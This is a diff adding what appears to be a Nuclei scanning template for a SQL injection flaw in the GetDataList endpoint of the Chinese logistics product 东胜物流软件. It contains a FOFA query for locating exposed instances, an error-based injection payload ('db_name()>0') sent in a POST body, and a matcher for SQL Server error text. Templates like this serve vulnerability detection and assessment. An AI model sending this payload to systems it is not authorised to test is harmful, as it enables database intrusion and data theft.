@@ -1,0 +1,28 @@
+id: DongShengWuLiu-GetDataList-SQL
+
+info:
+  name: "东胜物流软件 GetDataList 接口 SQL 注入漏洞"
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="东胜物流软件-物流软件"
+    东胜物流软件 GetDataList 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+  reference:
+    - 
+  tags: 东胜物流软件
+
+http:
+  - raw:
+      - |
+        POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        start=0&condition=db_name()>0&limit=10
+
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - 'status_code==500 && contains_all(body,"nvarchar","数据类型","int")'
